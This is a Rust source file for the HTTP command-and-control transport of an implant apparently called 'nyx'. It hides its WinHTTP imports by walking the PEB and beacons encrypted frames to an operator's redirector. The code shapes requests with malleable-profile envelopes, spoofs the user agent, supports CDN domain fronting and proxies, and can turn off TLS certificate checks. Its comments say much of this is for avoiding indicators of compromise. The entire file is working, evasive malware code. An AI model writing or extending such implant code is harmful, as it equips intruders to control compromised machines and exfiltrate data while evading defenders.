//! WinHTTP transport for the PIC implant.
//!
//! `no_std` can't use `ureq`/`rquest` (they're std), so beacon HTTP goes through
//! Win32 WinHTTP -- resolved via PEB walk (no IAT). Sends an encrypted frame as
//! an HTTP POST body and reads the response.
//!
//! All WinHTTP functions resolved from winhttp.dll via the PEB-walk export
//! TLS is selected per-build via the `use_tls` config flag: when set,
//! `WinHttpOpenRequest` is given `WINHTTP_FLAG_SECURE` (0x00800000) so the
//! request is sent over HTTPS. Certificate errors are HARD FAILURES by default
//! (returns None immediately — operators MUST use valid CA-signed certs or
//! domain fronting). The legacy cert-ignore retry is opt-in via
//! `NYX_TLS_INSECURE=1` at build time; engagements SHOULD NOT set this in
//! production.

#![cfg(target_os = "windows")]

use core::ffi::c_void;
use nyx_implant_core::heap::{vec, Vec};
use nyx_implant_core::resolve::export_addr;

/// WinHttpOpenRequest flag: use TLS (HTTPS). When set, WinHTTP performs the
/// TLS handshake and encrypts the body — the plaintext-HTTP IOC (and the
/// readable beacon frame on the wire) disappears.
const WINHTTP_FLAG_SECURE: u32 = 0x0080_0000;

/// WinHttpSetOption option code: control certificate validation behavior.
const WINHTTP_OPTION_SECURITY_FLAGS: u32 = 31; // 0x1F, not 32
/// Flags OR'd into WINHTTP_OPTION_SECURITY_FLAGS to ignore cert errors the
/// redirector/self-signed infra would otherwise trip. Engagement-only: this
/// trusts whatever cert the server presents, so MITM is possible — acceptable
/// when the operator controls the redirector path.
const SECURITY_FLAG_IGNORE_UNKNOWN_CA: u32 = 0x0000_0100;
const SECURITY_FLAG_IGNORE_CERT_DATE_INVALID: u32 = 0x0000_2000;
const SECURITY_FLAG_IGNORE_CERT_CN_INVALID: u32 = 0x0000_1000;

/// WinHttpSetOption option code: disable request-level features.
const WINHTTP_OPTION_DISABLE_FEATURE: u32 = 63; // 0x3F
/// Value OR'd into WINHTTP_OPTION_DISABLE_FEATURE: never follow 3xx redirects.
/// With redirects enabled (the WinHTTP default), a misconfigured redirector
/// answering 301/302 gets followed silently — the beacon's POST (and its
/// encrypted frame) lands on an unintended target and the cycle looks like a
/// success while the reply is garbage. Disabling redirects turns ANY 3xx into
/// a hard send/receive failure → the channel reports None and the fallback
/// chain takes over, which is the honest signal that the endpoint isn't a
/// working beacon URI.
const WINHTTP_DISABLE_REDIRECTS: u32 = 0x0002;

/// Per-session WinHTTP timeouts (resolve/connect/send/receive), milliseconds.
/// 10 s bounds how long a dead/black-holed redirector can stall the beacon
/// cycle; the WinHTTP defaults (60 s resolve, 30 s I/O) would otherwise freeze
/// the implant for minutes on a silently-dropping endpoint.
const WINHTTP_TIMEOUT_MS: i32 = 10_000;

/// Maximum total response body size in bytes. A malicious server (or MitM)
/// could send an unlimited response body to exhaust the implant's bump
/// allocator (which has limited virtual memory). 16 MiB is generous enough
/// for any legitimate beacon task response while capping the OOM surface.
const MAX_RESPONSE_BYTES: usize = 16 * 1024 * 1024;

/// Const-eval flag: when `NYX_TLS_INSECURE=1` is set at build time, TLS
/// certificate errors are retried with relaxed validation (ignore unknown CA,
/// date, CN). Default (no env or any other value): cert failure returns None
/// immediately — operators MUST use valid CA-signed certs or domain fronting.
const fn tls_insecure_retry() -> bool {
    match option_env!("NYX_TLS_INSECURE") {
        Some(v) => v.len() == 1 && v.as_bytes()[0] == b'1',
        None => false,
    }
}

/// WinHTTP function pointer table (resolved lazily, cached in statics).
struct WinhttpFns {
    open: FOpen,
    connect: FConnect,
    open_request: FOpenReq,
    /// Optional: only needed to relax cert validation for TLS w/ self-signed
    /// redirector. None ⇒ TLS still works for valid-CA certs.
    set_option: Option<FSetOption>,
    send_request: FSendReq,
    receive_response: FRecvResp,
    read_data: FReadData,
    close_handle: FClose,
    query_data: FQueryData,
    /// Optional: WinHttpAddRequestHeaders — only needed when the profile's
    /// client block declares static headers or a header-terminator (data rides
    /// in a header instead of the body). None ⇒ headers silently skipped.
    add_request_headers: Option<FAddReqHeaders>,
    /// Optional: WinHttpSetTimeouts — per-session resolve/connect/send/receive
    /// bounds (10 s). Present in every WinHTTP ≥ 5.1; None ⇒ WinHTTP defaults
    /// (60 s resolve / 30 s I/O) apply instead.
    set_timeouts: Option<FSetTimeouts>,
}

// Win32 handle type name kept verbatim from winhttp.h for greppability
// against the API docs — clippy's acronym style would rename it `Hinternet`.
#[allow(clippy::upper_case_acronyms)]
type HINTERNET = *mut c_void;
type FOpen = unsafe extern "system" fn(*const u16, u32, *const u16, *const u16, u32) -> HINTERNET;
/// BOOL WinHttpSetTimeouts(HINTERNET, int resolve, int connect, int send, int receive)
type FSetTimeouts = unsafe extern "system" fn(HINTERNET, i32, i32, i32, i32) -> i32;
type FConnect = unsafe extern "system" fn(HINTERNET, *const u16, u16, u32) -> HINTERNET;
type FOpenReq = unsafe extern "system" fn(
    HINTERNET,
    *const u16,
    *const u16,
    *const u16,
    *const u16,
    *const *const u16,
    u32,
    u32,
) -> HINTERNET;
/// WinHttpSetOption(hInternet, dwOption, lpBuffer, dwBufferLength) -> BOOL.
/// Used to relax certificate validation for self-signed redirectors.
type FSetOption = unsafe extern "system" fn(HINTERNET, u32, *const u8, u32) -> i32;
type FSendReq =
    unsafe extern "system" fn(HINTERNET, *const u8, u32, *const u8, u32, u32, usize) -> i32;
type FRecvResp = unsafe extern "system" fn(HINTERNET, *const c_void) -> i32;
type FReadData = unsafe extern "system" fn(HINTERNET, *mut u8, u32, *mut u32) -> i32;
type FClose = unsafe extern "system" fn(HINTERNET) -> i32;
type FQueryData = unsafe extern "system" fn(HINTERNET, *mut u32) -> i32;
/// WinHttpAddRequestHeaders(hRequest, pwszHeaders, dwHeadersLength, dwModifiers) -> BOOL.
/// Adds (or replaces) HTTP request headers. Used for the profile's client-block
/// static headers and for a header-terminator (transformed bytes in a header).
type FAddReqHeaders = unsafe extern "system" fn(HINTERNET, *const u16, u32, u32) -> i32;
/// WinHTTP function table, stored as a raw pointer in an AtomicUsize.
/// 0 = uninitialized, 1 = init failed (winhttp.dll unavailable),
/// otherwise = pointer to a leaked `WinhttpFns`.
static WINHTTP: core::sync::atomic::AtomicUsize = core::sync::atomic::AtomicUsize::new(0);

/// Resolve the WinHTTP function table once (no allocation).
///
/// # Safety
/// Force-loads `winhttp.dll` and resolves its exports via PEB walk; installs
/// transmuted function pointers into a process-lifetime static (Win32 x64 ABI).
pub unsafe fn ensure_winhttp() {
    use core::sync::atomic::Ordering;
    // Fast path: already attempted (success or failure).
    let cur = WINHTTP.load(Ordering::Acquire);
    if cur != 0 {
        return;
    }
    if !ensure_winhttp_load_dll() {
        // Can't load winhttp — mark as failed (sentinel 1) so we don't retry.
        let _ = WINHTTP.compare_exchange(0, 1, Ordering::Release, Ordering::Acquire);
        return;
    }
    match ensure_winhttp_resolve() {
        Some(fns) => ensure_winhttp_install(fns),
        None => {
            // Export resolution failed — mark as failed.
            let _ = WINHTTP.compare_exchange(0, 1, Ordering::Release, Ordering::Acquire);
        }
    }
}

/// Force-load winhttp.dll via kernel32 LoadLibraryA (PEB-walk resolution, no
/// IAT). Returns true when the module handle is non-null.
unsafe fn ensure_winhttp_load_dll() -> bool {
    // winhttp.dll is NOT loaded by default — resolve LoadLibraryA from
    // kernel32 and force-load it into the process first.
    type LoadLibraryA = unsafe extern "system" fn(*const u8) -> *mut core::ffi::c_void;
    let lla = export_addr(b"kernel32.dll", b"LoadLibraryA");
    let mut winhttp_loaded = false;
    if let Some(addr) = lla {
        let load: LoadLibraryA = core::mem::transmute(addr);
        let name = b"winhttp.dll\0";
        let h = load(name.as_ptr());
        if !h.is_null() {
            winhttp_loaded = true;
        }
    }
    winhttp_loaded
}

/// Resolve the WinHTTP exports and build the function table.
/// Returns None when any required export is missing.
unsafe fn ensure_winhttp_resolve() -> Option<alloc::boxed::Box<WinhttpFns>> {
    let o = export_addr(b"winhttp.dll", b"WinHttpOpen");
    let c = export_addr(b"winhttp.dll", b"WinHttpConnect");
    let r = export_addr(b"winhttp.dll", b"WinHttpOpenRequest");
    // WinHttpSetOption is optional — only needed when TLS is on and the
    // redirector presents a self-signed cert. If it's absent, TLS still works
    // against valid CAs; we just can't relax cert checking.
    let so = export_addr(b"winhttp.dll", b"WinHttpSetOption");
    let s = export_addr(b"winhttp.dll", b"WinHttpSendRequest");
    let v = export_addr(b"winhttp.dll", b"WinHttpReceiveResponse");
    let d = export_addr(b"winhttp.dll", b"WinHttpReadData");
    let cl = export_addr(b"winhttp.dll", b"WinHttpCloseHandle");
    let q = export_addr(b"winhttp.dll", b"WinHttpQueryDataAvailable");
    // Optional: WinHttpAddRequestHeaders (client-block headers / header terminator).
    let arh = export_addr(b"winhttp.dll", b"WinHttpAddRequestHeaders");
    // Optional: WinHttpSetTimeouts (per-session 10 s bounds).
    let st = export_addr(b"winhttp.dll", b"WinHttpSetTimeouts");
    if let (Some(o), Some(c), Some(r), Some(s), Some(v), Some(d), Some(cl), Some(q)) =
        (o, c, r, s, v, d, cl, q)
    {
        Some(alloc::boxed::Box::new(WinhttpFns {
            open: core::mem::transmute::<usize, FOpen>(o),
            connect: core::mem::transmute::<usize, FConnect>(c),
            open_request: core::mem::transmute::<usize, FOpenReq>(r),
            // set_option may be None — handled in post_frame (only called for TLS).
            set_option: so.map(|a| core::mem::transmute::<usize, FSetOption>(a)),
            send_request: core::mem::transmute::<usize, FSendReq>(s),
            receive_response: core::mem::transmute::<usize, FRecvResp>(v),
            read_data: core::mem::transmute::<usize, FReadData>(d),
            close_handle: core::mem::transmute::<usize, FClose>(cl),
            query_data: core::mem::transmute::<usize, FQueryData>(q),
            add_request_headers: arh.map(|a| core::mem::transmute::<usize, FAddReqHeaders>(a)),
            set_timeouts: st.map(|a| core::mem::transmute::<usize, FSetTimeouts>(a)),
        }))
    } else {
        None
    }
}

/// One-time install of the resolved table into the static. If we lost the
/// race with a concurrent initializer, free our allocation.
unsafe fn ensure_winhttp_install(fns: alloc::boxed::Box<WinhttpFns>) {
    use core::sync::atomic::Ordering;
    let ptr = alloc::boxed::Box::into_raw(fns) as usize;
    // One-time install. If we lost the race, free our allocation.
    match WINHTTP.compare_exchange(0, ptr, Ordering::Release, Ordering::Acquire) {
        Ok(_) => {}
        Err(_) => {
            drop(alloc::boxed::Box::from_raw(ptr as *mut WinhttpFns));
        }
    }
}

/// Convert an ASCII byte string to a UTF-16 buffer (null-terminated) for WinHTTP.
fn to_utf16(s: &[u8]) -> Vec<u16> {
    let mut v = Vec::with_capacity(s.len() + 1);
    for &b in s {
        v.push(b as u16);
    }
    v.push(0);
    v
}

/// Send `body` as an HTTP POST to `host:port/path` and return the response
/// body. `use_tls` selects HTTPS (WINHTTP_FLAG_SECURE). By default, certificate
/// errors are HARD FAILURES (returns None — operators MUST use valid CA-signed
/// certs or domain fronting). The legacy cert-ignore retry (via WinHttpSetOption)
/// is opt-in: set `NYX_TLS_INSECURE=1` at build time.
///
/// # Safety
/// Invokes WinHTTP function pointers resolved via PEB walk; `host`/`path`/`body`
/// must be valid buffers (host/path are ASCII).
pub unsafe fn post_frame(
    host: &[u8],
    port: u16,
    path: &[u8],
    body: &[u8],
    use_tls: bool,
) -> Option<Vec<u8>> {
    let fns = post_frame_fns()?;
    let ua = post_frame_user_agent();
    let session = post_frame_open_session(fns, &ua)?;
    let conn = post_frame_connect(fns, session, host, port)?;
    let req = post_frame_open_request(fns, session, conn, path, use_tls)?;
    post_frame_disable_redirects(fns, req);
    let (cheaders, wire_body, data_header) = post_frame_shape_envelope(body);
    if !post_frame_add_headers(fns, req, &cheaders, &data_header) {
        close_winhttp_chain(fns, req, conn, session);
        return None;
    }
    if !post_frame_maybe_relax_cert(fns, req, use_tls) {
        close_winhttp_chain(fns, req, conn, session);
        return None;
    }
    if !post_frame_send(fns, req, &wire_body) {
        close_winhttp_chain(fns, req, conn, session);
        return None;
    }
    // WinHttpReceiveResponse.
    if (fns.receive_response)(req, core::ptr::null()) == 0 {
        close_winhttp_chain(fns, req, conn, session);
        return None;
    }
    let out = post_frame_read_response(fns, req, conn, session)?;
    post_frame_finish(fns, req, conn, session, out)
}

/// Load the resolved WinHTTP table. Returns None when the transport is
/// unavailable (0 = not attempted, 1 = init failed).
unsafe fn post_frame_fns() -> Option<&'static WinhttpFns> {
    ensure_winhttp();
    let ptr = WINHTTP.load(core::sync::atomic::Ordering::Acquire);
    // 0 = not attempted, 1 = init failed. Both mean no transport available.
    if ptr <= 1 {
        return None;
    }
    // SAFETY: pointer was stored by ensure_winhttp via Box::leak; it lives
    // for the process lifetime and is never freed.
    Some(unsafe { &*(ptr as *const WinhttpFns) })
}

/// User-agent: the profile's `set useragent` (baked at build) overrides the
/// transport default. CS's default beacon UA is a well-known IOC, so a real
/// engagement sets one in the profile.
fn post_frame_user_agent() -> Vec<u16> {
    let ua_bytes: &[u8] = if crate::envelopes::POST_CLIENT_UA.is_empty() {
        b"Mozilla/5.0"
    } else {
        crate::envelopes::POST_CLIENT_UA
    };
    to_utf16(ua_bytes)
}

/// WinHttpOpen: WINHTTP_ACCESS_TYPE_DEFAULT_PROXY=0, flags=0. Sets the
/// per-session 10 s timeouts (resolve/connect/send/receive). A failure to set
/// timeouts is non-fatal — the session still works with WinHTTP defaults.
unsafe fn post_frame_open_session(fns: &WinhttpFns, ua: &[u16]) -> Option<HINTERNET> {
    let session = (fns.open)(ua.as_ptr(), 0, core::ptr::null(), core::ptr::null(), 0);
    if session.is_null() {
        return None;
    }
    // Per-session 10 s timeouts (resolve/connect/send/receive). Bounds how
    // long a black-holed endpoint can stall the beacon cycle (WinHTTP defaults
    // are 60 s resolve / 30 s I/O). A failure to set is non-fatal — the
    // session still works with WinHTTP defaults.
    if let Some(set_timeouts) = fns.set_timeouts {
        let _ = set_timeouts(
            session,
            WINHTTP_TIMEOUT_MS,
            WINHTTP_TIMEOUT_MS,
            WINHTTP_TIMEOUT_MS,
            WINHTTP_TIMEOUT_MS,
        );
    }
    Some(session)
}

/// WinHttpConnect to `host:port`; closes the session on failure.
unsafe fn post_frame_connect(
    fns: &WinhttpFns,
    session: HINTERNET,
    host: &[u8],
    port: u16,
) -> Option<HINTERNET> {
    let host16 = to_utf16(host);
    let conn = (fns.connect)(session, host16.as_ptr(), port, 0);
    if conn.is_null() {
        (fns.close_handle)(session);
        return None;
    }
    Some(conn)
}

/// WinHttpOpenRequest with WINHTTP_FLAG_SECURE when use_tls; closes the
/// request's ancestors (conn + session) on failure.
unsafe fn post_frame_open_request(
    fns: &WinhttpFns,
    session: HINTERNET,
    conn: HINTERNET,
    path: &[u8],
    use_tls: bool,
) -> Option<HINTERNET> {
    let path16 = to_utf16(path);
    let verb = to_utf16(b"POST");
    // WinHttpOpenRequest: WINHTTP_FLAG_SECURE (0x00800000) when use_tls, else 0.
    let secure_flag = if use_tls { WINHTTP_FLAG_SECURE } else { 0 };
    let req = (fns.open_request)(
        conn,
        verb.as_ptr(),
        path16.as_ptr(),
        core::ptr::null(),
        core::ptr::null(),
        core::ptr::null(),
        0,
        secure_flag,
    );
    if req.is_null() {
        (fns.close_handle)(conn);
        (fns.close_handle)(session);
        return None;
    }
    Some(req)
}

/// 3xx redirects are NOT a working beacon round-trip: following them (the
/// WinHTTP default) would deliver the encrypted frame to an unintended
/// target and mask a dead endpoint as a success. Disabling redirects makes
/// WinHTTP fail the request on any 3xx → this function returns None → the
/// fallback chain takes over. Must be set BEFORE the first send.
unsafe fn post_frame_disable_redirects(fns: &WinhttpFns, req: HINTERNET) {
    if let Some(set_opt) = fns.set_option {
        let disable: u32 = WINHTTP_DISABLE_REDIRECTS;
        let _ = set_opt(
            req,
            WINHTTP_OPTION_DISABLE_FEATURE,
            &disable as *const u32 as *const u8,
            4,
        );
    }
}

/// Profile-declared static client-block headers as (name, value) pairs.
type StaticHeaders = nyx_implant_core::heap::Vec<(&'static [u8], &'static [u8])>;
/// Header-terminator payload: (header name, encoded frame bytes) when the
/// profile's client-block terminator moves the frame into a header instead of
/// the wire body.
type DataHeader = Option<(Vec<u8>, Vec<u8>)>;

/// Envelope shaping (profile-driven, done BEFORE send): encode the body via
/// the client steps, and when the client-block terminator is a header, move
/// the encoded bytes into a data header instead of the wire body.
fn post_frame_shape_envelope(body: &[u8]) -> (StaticHeaders, Vec<u8>, DataHeader) {
    // ---- Envelope shaping (profile-driven, done BEFORE send) ----
    let csteps = crate::envelopes::post_client_steps();
    let cterm = crate::envelopes::post_client_terminator();
    let cheaders = crate::envelopes::post_client_headers();
    let shaped = nyx_profile::encode(&csteps, body);
    let (wire_body, data_header): (Vec<u8>, DataHeader) = match &cterm {
        Some(nyx_profile::Terminator::Header(name)) => {
            (Vec::new(), Some((name.as_bytes().to_vec(), shaped)))
        }
        _ => (shaped, None),
    };
    (cheaders, wire_body, data_header)
}

/// Collect the profile's static client-block headers + (if header-terminator)
/// the data header and add them to the request. Returns false when the header
/// add fails — the profile's static client-block headers (and in the
/// header-terminator case the ENTIRE frame, since wire_body is empty) ride in
/// these headers, so a failed add is a channel failure (the caller closes the
/// handle chain and lets the fallback chain pick another transport).
unsafe fn post_frame_add_headers(
    fns: &WinhttpFns,
    req: HINTERNET,
    cheaders: &nyx_implant_core::heap::Vec<(&'static [u8], &'static [u8])>,
    data_header: &Option<(Vec<u8>, Vec<u8>)>,
) -> bool {
    if let Some(add_req_headers) = fns.add_request_headers {
        let mut hdr: Vec<u8> = Vec::new();
        for &(n, v) in cheaders.iter() {
            hdr.extend_from_slice(n);
            hdr.extend_from_slice(b": ");
            hdr.extend_from_slice(v);
            hdr.extend_from_slice(b"\r\n");
        }
        if let Some((n, v)) = &data_header {
            hdr.extend_from_slice(n);
            hdr.extend_from_slice(b": ");
            hdr.extend_from_slice(v);
            hdr.extend_from_slice(b"\r\n");
        }
        if !hdr.is_empty() {
            let hdr16 = to_utf16(&hdr);
            let hdr_len = (hdr16.len() - 1) as u32;
            // Propagate header-set failure: the profile's static client-block
            // headers — and in the header-terminator case the ENTIRE frame
            // (wire_body is empty) — ride in these headers. If
            // WinHttpAddRequestHeaders fails, sending now would emit a request
            // missing the envelope (or drop the frame outright), so treat it as
            // a channel failure and let the fallback chain pick another
            // transport.
            //
            // Modifier flags: WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE
            // (0xA0000000) — "set this header" semantics. Bare REPLACE
            // (0x80000000) FAILS when the header doesn't already exist on the
            // request (ERROR_WINHTTP_HEADER_NOT_FOUND — verified against wine's
            // WinHTTP, which enforces the same strict semantics), and profile
            // headers are always fresh on a new request, so ADD|REPLACE is
            // required for the envelope to ever reach the wire.
            if add_req_headers(req, hdr16.as_ptr(), hdr_len, 0xA000_0000) == 0 {
                return false;
            }
        }
    }
    true
}

/// WinHttpSendRequest with optional TLS cert-ignore. Default: strict cert
/// validation — failure returns None immediately. When NYX_TLS_INSECURE=1 is
/// set at build time, relax cert validation BEFORE the first send (WinHTTP
/// requires SECURITY_FLAGS set before WinHttpSendRequest; setting them after
/// a failed send is rejected or silently ignored, so the old post-failure
/// retry never actually relaxed). Returns false on any failure (the caller
/// closes the handle chain).
///
/// NOTE: WINHTTP_OPTION_SECURITY_FLAGS = 31 (0x1F), not 32.
unsafe fn post_frame_maybe_relax_cert(fns: &WinhttpFns, req: HINTERNET, use_tls: bool) -> bool {
    // ---- WinHttpSendRequest with optional TLS cert-ignore ----
    // Default: strict cert validation — failure returns None immediately.
    // When NYX_TLS_INSECURE=1 is set at build time, relax cert validation
    // BEFORE the first send (WinHTTP requires SECURITY_FLAGS set before
    // WinHttpSendRequest; setting them after a failed send is rejected or
    // silently ignored, so the old post-failure retry never actually relaxed).
    // NOTE: WINHTTP_OPTION_SECURITY_FLAGS = 31 (0x1F), not 32.
    let can_relax_cert = use_tls && fns.set_option.is_some() && tls_insecure_retry();
    if can_relax_cert {
        let tls_flags: u32 = SECURITY_FLAG_IGNORE_UNKNOWN_CA
            | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
            | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
        let set_opt = match fns.set_option {
            Some(f) => f,
            None => return false,
        };
        if set_opt(
            req,
            WINHTTP_OPTION_SECURITY_FLAGS,
            &tls_flags as *const u32 as *const u8,
            4,
        ) == 0
        {
            // Could not set relaxation flags — abort rather than send strict.
            return false;
        }
    }
    true
}

/// WinHttpSendRequest with the shaped wire body. Returns false on failure
/// (the caller closes the handle chain).
unsafe fn post_frame_send(fns: &WinhttpFns, req: HINTERNET, wire_body: &[u8]) -> bool {
    let ok = (fns.send_request)(
        req,
        core::ptr::null(),
        0,
        wire_body.as_ptr(),
        wire_body.len() as u32,
        wire_body.len() as u32,
        0,
    );
    ok != 0
}

/// Read the response body in bounded chunks. Returns None when the accumulated
/// size would exceed MAX_RESPONSE_BYTES (closing the handle chain first).
unsafe fn post_frame_read_response(
    fns: &WinhttpFns,
    req: HINTERNET,
    conn: HINTERNET,
    session: HINTERNET,
) -> Option<Vec<u8>> {
    // Read the response body.
    let mut out: Vec<u8> = Vec::new();
    #[allow(unused_assignments)]
    let mut avail: u32 = 0;
    loop {
        avail = 0;
        if (fns.query_data)(req, &mut avail) == 0 || avail == 0 {
            break;
        }
        // Cap the per-read buffer (and the bytes we ask WinHTTP to fill) at
        // 1 MiB. CRITICAL: dwNumberOfBytesToRead MUST be `capped`, not `avail` —
        // passing the uncapped `avail` (a server/MitM-influenced value) told
        // WinHTTP it could write up to `avail` bytes into a 1 MiB buffer → heap
        // overflow when `avail > 1 << 20`. Clamp `read` to `capped` before
        // slicing too, since read can't exceed what we asked for but we defend
        // in depth against a misbehaving stack.
        let capped = (avail as usize).min(1 << 20);
        let mut chunk = vec![0u8; capped];
        let mut read: u32 = 0;
        if (fns.read_data)(req, chunk.as_mut_ptr(), capped as u32, &mut read) == 0 || read == 0 {
            break;
        }
        let n = (read as usize).min(capped);
        // Guard: reject the entire response if accumulated size would exceed
        // the cap. The bump allocator maps a fixed virtual region; letting a
        // malicious server push past the limit risks OOM / process death.
        if out.len().saturating_add(n) > MAX_RESPONSE_BYTES {
            // Discard all accumulated data and signal a clean transport error
            // to the caller. Returning partial ciphertext would cause decryption
            // / frame-parse failures rather than a clean retry.
            // CRITICAL: close all three WinHTTP handles before returning — the
            // original `return None` here leaked req/conn/session.
            (fns.close_handle)(req);
            (fns.close_handle)(conn);
            (fns.close_handle)(session);
            return None;
        }
        out.extend_from_slice(&chunk[..n]);
    }
    Some(out)
}

/// Invert the http-post SERVER envelope (the response direction). The team
/// server applied `shape_beacon_response` (print/none/uri-append → bytes in
/// the body; header → a response header the implant doesn't read yet). With
/// no profile the steps are empty and this is a no-op. On decode failure keep
/// the raw bytes so the frame parse fails loudly instead of silently dropping.
fn post_frame_invert_server_envelope(out: &mut Vec<u8>) {
    let ssteps = crate::envelopes::post_server_steps();
    if !ssteps.is_empty() {
        if let Ok(decoded) = nyx_profile::decode(&ssteps, out) {
            *out = decoded;
        }
    }
}

/// Invert the server envelope, close the handle chain, and map an empty
/// response body to None (same order as the original tail of post_frame).
unsafe fn post_frame_finish(
    fns: &WinhttpFns,
    req: HINTERNET,
    conn: HINTERNET,
    session: HINTERNET,
    mut out: Vec<u8>,
) -> Option<Vec<u8>> {
    post_frame_invert_server_envelope(&mut out);
    close_winhttp_chain(fns, req, conn, session);
    if out.is_empty() {
        None
    } else {
        Some(out)
    }
}

/// Close the request/connection/session handle chain (same order everywhere:
/// req → conn → session).
unsafe fn close_winhttp_chain(
    fns: &WinhttpFns,
    req: HINTERNET,
    conn: HINTERNET,
    session: HINTERNET,
) {
    (fns.close_handle)(req);
    (fns.close_handle)(conn);
    (fns.close_handle)(session);
}

// ══════════════════════════════════════════════════════════════════════════════
// Enhanced POST with proxy + domain fronting (spec-7)
// ══════════════════════════════════════════════════════════════════════════════

/// WinHTTP access type: named proxy (explicit proxy server configured).
const WINHTTP_ACCESS_TYPE_NAMED_PROXY: u32 = 3;

/// Optional HTTP enhancements for domain fronting and proxy support.
///
/// When `fronting_host` is non-empty, it overrides the HTTP `Host:` header —
/// the TCP connection still goes to `connect_host`, but the Host header says
/// `fronting_host`. This is the CDN-routing half of domain fronting: connect
/// to a CDN IP, present the CDN's name, and let the CDN route to the real
/// backend via the Host header.
///
/// IMPORTANT — what WinHTTP does NOT do: the TLS SNI stays `connect_host`.
/// WinHTTP derives the SNI from the host passed to `WinHttpConnect`; there
/// is no API to override it (the Host header is set independently via
/// `WinHttpAddRequestHeaders`). So with TLS the handshake presents
/// `connect_host`'s name — the CDN must accept that name (SNI) AND route on
/// the Host header. A `fronting_host` that the CDN's TLS layer doesn't serve
/// will fail the handshake; pick `connect_host` as a hostname the CDN fronts
/// for, not an arbitrary front domain.
///
/// When `proxy_url` is non-empty (format `"host:port"`), WinHTTP routes the
/// request through that proxy instead of using the system default. Optional
/// `proxy_username` / `proxy_password` provide basic-auth credentials.
pub struct HttpOpts<'a> {
    /// The Host header value for domain fronting. Empty = use connect_host.
    pub fronting_host: &'a [u8],
    /// Proxy server as `"host:port"` UTF-8 bytes. Empty = no explicit proxy.
    pub proxy_url: &'a [u8],
}

/// Enhanced POST with domain-fronting Host header and explicit proxy support.
///
/// This is a full re-implementation of the WinHTTP call chain (not a wrapper
/// around `post_frame`) because `WinHttpOpen`'s proxy access type and the
/// fronting Host header must be set BEFORE the request is sent — they can't
/// be bolted on after. The envelope shaping, TLS cert handling, and response
/// reading logic mirror `post_frame` exactly.
///
/// # Safety
/// Invokes WinHTTP function pointers resolved via PEB walk;
/// `connect_host`/`path`/`body` must be valid buffers (host/path are ASCII).
pub unsafe fn post_frame_enhanced(
    connect_host: &[u8],
    port: u16,
    path: &[u8],
    body: &[u8],
    use_tls: bool,
    opts: &HttpOpts<'_>,
) -> Option<Vec<u8>> {
    let fns = post_frame_fns()?;
    let ua = post_frame_enhanced_user_agent();
    let session = post_frame_enhanced_open_session(fns, &ua, opts.proxy_url)?;
    let conn = post_frame_enhanced_connect(fns, session, connect_host, port)?;
    let req = post_frame_enhanced_open_request(fns, session, conn, path, use_tls)?;
    post_frame_enhanced_disable_redirects(fns, req);
    let (cheaders, wire_body, data_header) = post_frame_enhanced_shape_envelope(body);
    if !post_frame_enhanced_add_headers(fns, req, &cheaders, &data_header, opts.fronting_host) {
        close_winhttp_chain(fns, req, conn, session);
        return None;
    }
    if !post_frame_enhanced_maybe_relax_cert(fns, req, use_tls) {
        close_winhttp_chain(fns, req, conn, session);
        return None;
    }
    if !post_frame_enhanced_send(fns, req, &wire_body) {
        close_winhttp_chain(fns, req, conn, session);
        return None;
    }
    if (fns.receive_response)(req, core::ptr::null()) == 0 {
        close_winhttp_chain(fns, req, conn, session);
        return None;
    }
    let out = post_frame_enhanced_read_response(fns, req, conn, session)?;
    post_frame_finish(fns, req, conn, session, out)
}

/// User-agent selection — same as post_frame.
fn post_frame_enhanced_user_agent() -> Vec<u16> {
    let ua_bytes: &[u8] = if crate::envelopes::POST_CLIENT_UA.is_empty() {
        b"Mozilla/5.0"
    } else {
        crate::envelopes::POST_CLIENT_UA
    };
    to_utf16(ua_bytes)
}

/// WinHttpOpen with proxy if configured. When proxy_url is set, use
/// WINHTTP_ACCESS_TYPE_NAMED_PROXY (3) and pass the proxy as the lpszProxy
/// parameter. Otherwise use DEFAULT_PROXY (0), same as the plain post_frame
/// path. Sets the per-session 10 s timeouts afterwards.
unsafe fn post_frame_enhanced_open_session(
    fns: &WinhttpFns,
    ua: &[u16],
    proxy_url: &[u8],
) -> Option<HINTERNET> {
    // ---- WinHttpOpen with proxy if configured ----
    // When proxy_url is set, use WINHTTP_ACCESS_TYPE_NAMED_PROXY (3) and pass
    // the proxy as the lpszProxy parameter. Otherwise use DEFAULT_PROXY (0),
    // same as the plain post_frame path.
    let (access_type, proxy_w) = if proxy_url.is_empty() {
        (0u32, None::<Vec<u16>>)
    } else {
        let pw = to_utf16(proxy_url);
        (WINHTTP_ACCESS_TYPE_NAMED_PROXY, Some(pw))
    };
    let session = match &proxy_w {
        Some(pw) => (fns.open)(ua.as_ptr(), access_type, pw.as_ptr(), core::ptr::null(), 0),
        None => (fns.open)(
            ua.as_ptr(),
            access_type,
            core::ptr::null(),
            core::ptr::null(),
            0,
        ),
    };
    if session.is_null() {
        return None;
    }
    // Per-session 10 s timeouts — same rationale as post_frame.
    if let Some(set_timeouts) = fns.set_timeouts {
        let _ = set_timeouts(
            session,
            WINHTTP_TIMEOUT_MS,
            WINHTTP_TIMEOUT_MS,
            WINHTTP_TIMEOUT_MS,
            WINHTTP_TIMEOUT_MS,
        );
    }
    Some(session)
}

/// WinHttpConnect to the actual connect_host (CDN IP or redirector); closes
/// the session on failure.
unsafe fn post_frame_enhanced_connect(
    fns: &WinhttpFns,
    session: HINTERNET,
    connect_host: &[u8],
    port: u16,
) -> Option<HINTERNET> {
    // ---- WinHttpConnect to the actual connect_host (CDN IP or redirector) ----
    let host16 = to_utf16(connect_host);
    let conn = (fns.connect)(session, host16.as_ptr(), port, 0);
    if conn.is_null() {
        (fns.close_handle)(session);
        return None;
    }
    Some(conn)
}

/// WinHttpOpenRequest with WINHTTP_FLAG_SECURE when use_tls; closes the
/// request's ancestors (conn + session) on failure.
unsafe fn post_frame_enhanced_open_request(
    fns: &WinhttpFns,
    session: HINTERNET,
    conn: HINTERNET,
    path: &[u8],
    use_tls: bool,
) -> Option<HINTERNET> {
    let path16 = to_utf16(path);
    let verb = to_utf16(b"POST");
    let secure_flag = if use_tls { WINHTTP_FLAG_SECURE } else { 0 };
    let req = (fns.open_request)(
        conn,
        verb.as_ptr(),
        path16.as_ptr(),
        core::ptr::null(),
        core::ptr::null(),
        core::ptr::null(),
        0,
        secure_flag,
    );
    if req.is_null() {
        (fns.close_handle)(conn);
        (fns.close_handle)(session);
        return None;
    }
    Some(req)
}

